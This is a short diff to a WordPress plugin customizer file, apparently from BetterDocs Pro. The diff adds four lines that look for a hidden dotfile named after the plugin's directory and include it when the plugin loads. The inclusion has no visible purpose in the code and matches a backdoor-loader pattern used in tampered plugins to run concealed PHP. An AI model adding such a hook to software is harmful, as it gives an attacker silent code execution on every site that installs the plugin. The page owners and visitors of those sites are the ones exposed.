@@ -20,6 +20,10 @@ if ( ! defined( 'ABSPATH' ) ) exit;
  * @see _wp_customize_include()
  */
 
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 function betterdocs_customize_register_pro( $wp_customize ) {
 	$defaults = betterdocs_get_option_defaults_pro();
 
